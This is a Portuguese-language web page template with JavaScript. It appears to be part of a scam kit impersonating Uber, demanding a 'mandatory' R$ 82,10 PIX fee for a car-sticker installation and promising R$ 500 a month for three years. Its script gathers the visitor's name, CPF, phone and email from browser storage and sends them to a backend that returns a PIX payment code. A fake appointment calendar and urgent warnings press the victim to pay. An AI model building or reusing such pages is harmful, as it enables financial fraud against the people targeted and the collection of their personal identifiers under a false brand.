{% extends "layout.html" %}

{% block content %}
<div class="min-h-screen bg-white py-8 px-4">
    <div class="max-w-4xl mx-auto">
        <!-- Header Section -->
        <div class="text-center mb-12">
            <h1 style="font-size: 28px !important; line-height: 1.2 !important; font-weight: 700 !important; color: #333333 !important; margin-bottom: 16px !important; display: block !important;">Taxa de Instalação do Adesivo Uber</h1>
            <p style="font-size: 16px !important; line-height: 1.5 !important; color: #dc2626 !important; font-weight: 600 !important; display: block !important;">PAGAMENTO OBRIGATÓRIO</p>
        </div>

        <!-- Important Information -->
        <div class="mb-12">
            <h2 style="font-size: 28px !important; line-height: 1.2 !important; font-weight: 700 !important; color: #333333 !important; margin-bottom: 24px !important; display: block !important;">
                ⚠️ Informações Importantes sobre a Instalação
            </h2>
            <div style="font-size: 16px !important; line-height: 1.5 !important; color: #333333 !important;" class="space-y-3">
                <p style="margin-bottom: 12px !important; display: block !important;">• <strong>O adesivo DEVE ser instalado por um funcionário autorizado da Uber</strong></p>
                <p style="margin-bottom: 12px !important; display: block !important;">• O funcionário irá instalar o adesivo e tirar foto como comprovação</p>
                <p style="margin-bottom: 12px !important; display: block !important;">• <strong>Sem o pagamento desta taxa, você NÃO participará do programa</strong></p>
                <p style="margin-bottom: 12px !important; display: block !important;">• <strong>Sem a instalação, você NÃO receberá os R$ 500,00 mensais por 3 anos</strong></p>
            </div>
        </div>

        <!-- Appointment Scheduling -->
        <div class="mb-12">
            <h2 style="font-size: 28px; line-height: 1.2; font-weight: 700; color: #333333; margin-bottom: 24px;">Agendar Instalação do Adesivo</h2>
            
            <!-- Calendar -->
            <div class="mb-8">
                <h3 style="font-size: 16px; line-height: 1.5; font-weight: 600; color: #333333; margin-bottom: 16px;">Selecione o Dia:</h3>
                <div id="calendar" class="grid grid-cols-7 gap-2 text-center">
                    <!-- Calendar will be generated by JavaScript -->
                </div>
            </div>

            <!-- Time Selector -->
            <div class="mb-8">
                <h3 style="font-size: 16px; line-height: 1.5; font-weight: 600; color: #333333; margin-bottom: 16px;">Selecione o Horário:</h3>
                <div class="grid grid-cols-2 gap-3">
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="07:00 - 09:00">07:00 - 09:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="09:00 - 11:00">09:00 - 11:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="11:00 - 13:00">11:00 - 13:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="13:00 - 15:00">13:00 - 15:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="15:00 - 17:00">15:00 - 17:00</button>
                </div>
            </div>

            <!-- Selected Appointment Display -->
            <div id="selectedAppointment" class="mb-8" style="display: none;">
                <h4 style="font-size: 16px; line-height: 1.5; font-weight: 600; color: #059669; margin-bottom: 8px;">Agendamento Selecionado:</h4>
                <p style="font-size: 16px; line-height: 1.5; color: #333333;">
                    Data: <span id="selectedDate"></span><br>
                    Horário: <span id="selectedTime"></span>
                </p>
            </div>
        </div>

        <!-- Loading Message -->
        <div id="loadingMessage" class="text-center mb-8" style="font-size: 16px; line-height: 1.5; color: #666666;">
            Carregando dados de pagamento...
        </div>

        <!-- PIX Payment Section -->
        <div class="mb-8">
            <div class="text-center mb-8">
                <h2 style="font-size: 28px; line-height: 1.2; font-weight: 700; color: #333333; margin-bottom: 8px;">PIX - R$ 82,10</h2>
                <p style="font-size: 16px; line-height: 1.5; color: #666666;">Taxa de Instalação do Adesivo</p>
            </div>

            <!-- QR Code -->
            <div class="text-center mb-8">
                <img id="pixQrCode" src="" alt="QR Code PIX" class="mx-auto w-48 h-48 border rounded-lg" style="display: none;">
            </div>

            <!-- PIX Code Section -->
            <div id="pixCodeSection" class="mb-8" style="display: none;">
                <label style="font-size: 16px; line-height: 1.5; font-weight: 500; color: #333333; margin-bottom: 8px; display: block;">Código PIX (Copia e Cola)</label>
                <div class="flex gap-2">
                    <input type="text" id="pixCode" readonly class="flex-1 px-3 py-2 border border-gray-300 rounded-md text-sm font-mono bg-gray-50">
                    <button onclick="copyPixCode()" id="copyButton" class="px-4 py-2 bg-black text-white rounded-md hover:bg-gray-800 transition-colors">
                        Copiar
                    </button>
                </div>
            </div>

            <!-- Payment Instructions -->
            <div>
                <h3 style="font-size: 16px; line-height: 1.5; font-weight: 600; color: #333333; margin-bottom: 16px;">Como pagar:</h3>
                <ol class="list-decimal list-inside space-y-2" style="font-size: 16px; line-height: 1.5; color: #666666;">
                    <li>Selecione data e horário para instalação acima</li>
                    <li>Abra o app do seu banco</li>
                    <li>Escolha a opção PIX</li>
                    <li>Escaneie o QR Code ou cole o código</li>
                    <li>Confirme o pagamento de R$ 82,10</li>
                    <li>Aguarde nosso funcionário no dia e horário agendados</li>
                </ol>
            </div>
        </div>
    </div>
</div>

<script>
// Calendar and appointment scheduling
let selectedDate = null;
let selectedTime = null;

// Generate calendar for current month
function generateCalendar() {
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth();
    const today = now.getDate();
    
    const firstDay = new Date(currentYear, currentMonth, 1);
    const lastDay = new Date(currentYear, currentMonth + 1, 0);
    const daysInMonth = lastDay.getDate();
    const startDay = firstDay.getDay(); // 0 = Sunday
    
    const monthNames = ['Janeiro', 'Fevereiro', 'Março', 'Abril', 'Maio', 'Junho',
                       'Julho', 'Agosto', 'Setembro', 'Outubro', 'Novembro', 'Dezembro'];
    const dayNames = ['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sáb'];
    
    const calendar = document.getElementById('calendar');
    calendar.innerHTML = '';
    
    // Month/Year header
    const header = document.createElement('div');
    header.className = 'col-span-7 text-lg font-semibold text-center mb-4';
    header.style.fontSize = '16px';
    header.style.fontWeight = '600';
    header.style.color = '#333333';
    header.textContent = `${monthNames[currentMonth]} ${currentYear}`;
    calendar.appendChild(header);
    
    // Day names header
    dayNames.forEach(day => {
        const dayHeader = document.createElement('div');
        dayHeader.className = 'text-sm font-medium text-center py-2';
        dayHeader.style.fontSize = '14px';
        dayHeader.style.color = '#666666';
        dayHeader.textContent = day;
        calendar.appendChild(dayHeader);
    });
    
    // Empty cells for days before month starts
    for (let i = 0; i < startDay; i++) {
        const emptyDay = document.createElement('div');
        calendar.appendChild(emptyDay);
    }
    
    // Days of the month
    for (let day = 1; day <= daysInMonth; day++) {
        const dayElement = document.createElement('button');
        dayElement.textContent = day;
        dayElement.className = 'calendar-day';
        
        // Disable past days and next 3 days after current date
        if (day <= today + 3) {
            dayElement.disabled = true;
            dayElement.style.backgroundColor = '#f3f4f6';
            dayElement.style.color = '#9ca3af';
            dayElement.style.cursor = 'not-allowed';
        } else {
            dayElement.onclick = (e) => selectDate(day, currentMonth, currentYear, e.target);
        }
        
        calendar.appendChild(dayElement);
    }
}

// Select date function
function selectDate(day, month, year, element) {
    selectedDate = `${day}/${month + 1}/${year}`;
    
    // Update visual selection
    document.querySelectorAll('.calendar-day:not([disabled])').forEach(btn => {
        btn.classList.remove('selected');
    });
    
    element.classList.add('selected');
    
    updateSelectedAppointment();
}

// Select time function
function setupTimeSelector() {
    document.querySelectorAll('.time-slot').forEach(button => {
        button.onclick = function() {
            selectedTime = this.dataset.time;
            
            // Update visual selection
            document.querySelectorAll('.time-slot').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            this.classList.add('selected');
            
            updateSelectedAppointment();
        };
    });
}

// Update selected appointment display
function updateSelectedAppointment() {
    if (selectedDate && selectedTime) {
        document.getElementById('selectedDate').textContent = selectedDate;
        document.getElementById('selectedTime').textContent = selectedTime;
        document.getElementById('selectedAppointment').style.display = 'block';
        
        // Store appointment in localStorage
        localStorage.setItem('selectedAppointment', JSON.stringify({
            date: selectedDate,
            time: selectedTime
        }));
    }
}

// Auto-generate PIX payment on page load
document.addEventListener('DOMContentLoaded', async function() {
    // Generate calendar and setup time selector
    generateCalendar();
    setupTimeSelector();
    
    try {
        // Get user data from localStorage - check all possible sources
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
        
        // Try multiple localStorage keys for user data
        const userName = (
            paymentData.name || 
            userData.full_name || 
            userData.name || 
            localStorage.getItem('candidateName') || 
            localStorage.getItem('userName') || 
            ''
        );
        
        const userCPF = (
            paymentData.cpf || 
            userData.cpf || 
            localStorage.getItem('candidateCPF') || 
            localStorage.getItem('userCPF') || 
            ''
        );
        
        const userPhone = (
            paymentData.phone || 
            userData.phone || 
            localStorage.getItem('candidatePhone') || 
            localStorage.getItem('userPhone') || 
            ''
        );
        
        const userEmail = (
            paymentData.email || 
            userData.email || 
            localStorage.getItem('candidateEmail') || 
            localStorage.getItem('userEmail') || 
            ''
        );
        
        console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone, email: userEmail });
        
        if (userName && userCPF) {
            const payloadData = {
                name: userName,
                cpf: userCPF,
                email: userEmail,
                phone: userPhone
            };
            
            console.log('Sending payload:', payloadData);
            
            // Create payment using existing endpoint
            const response = await fetch('/create_cnv_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payloadData)
            });
            
            const result = await response.json();
            console.log('API Response:', result);
            
            if (result.success && result.payment_data) {
                const pixData = result.payment_data;
                console.log('PIX Data:', pixData);
                
                // Display real PIX code
                if (pixData.pixCopyPaste) {
                    const pixCodeElement = document.getElementById('pixCode');
                    if (pixCodeElement) {
                        pixCodeElement.value = pixData.pixCopyPaste;
                        document.getElementById('pixCodeSection').style.display = 'block';
                        console.log('PIX code set successfully');
                    }
                }
                
                // Display real QR Code
                if (pixData.pixQrCode) {
                    const qrCodeElement = document.getElementById('pixQrCode');
                    if (qrCodeElement) {
                        qrCodeElement.src = pixData.pixQrCode;
                        qrCodeElement.style.display = 'block';
                        console.log('QR Code displayed successfully');
                    }
                }
                
                // Store payment ID for status checking
                if (pixData.paymentId) {
                    localStorage.setItem('cnvPaymentId', pixData.paymentId);
                    console.log('Payment ID stored:', pixData.paymentId);
                }
                
                // Hide loading message
                const loadingElement = document.getElementById('loadingMessage');
                if (loadingElement) {
                    loadingElement.style.display = 'none';
                }
                
            } else {
                throw new Error(result.error || 'Erro ao criar pagamento PIX');
            }
        } else {
            console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
            document.getElementById('loadingMessage').innerHTML = `
                <div class="text-red-600">
                    Dados do usuário não encontrados no localStorage.<br>
                    Nome: ${userName || 'não encontrado'}<br>
                    CPF: ${userCPF || 'não encontrado'}<br>
                    <a href="/" class="text-blue-600 underline">Voltar ao início</a>
                </div>
            `;
        }
    } catch (error) {
        console.error('Erro ao criar pagamento:', error);
        document.getElementById('loadingMessage').innerHTML = `
            <div class="text-red-600">
                Erro ao carregar dados de pagamento: ${error.message}<br>
                <a href="/" class="text-blue-600 underline">Voltar ao início</a>
            </div>
        `;
    }
});

// Copy PIX code function
function copyPixCode() {
    const pixCodeElement = document.getElementById('pixCode');
    pixCodeElement.select();
    pixCodeElement.setSelectionRange(0, 99999);
    document.execCommand('copy');
    
    const copyButton = document.getElementById('copyButton');
    copyButton.textContent = 'Copiado!';
    copyButton.classList.remove('bg-black', 'hover:bg-gray-800');
    copyButton.classList.add('bg-green-600');
}
</script>

{% endblock %}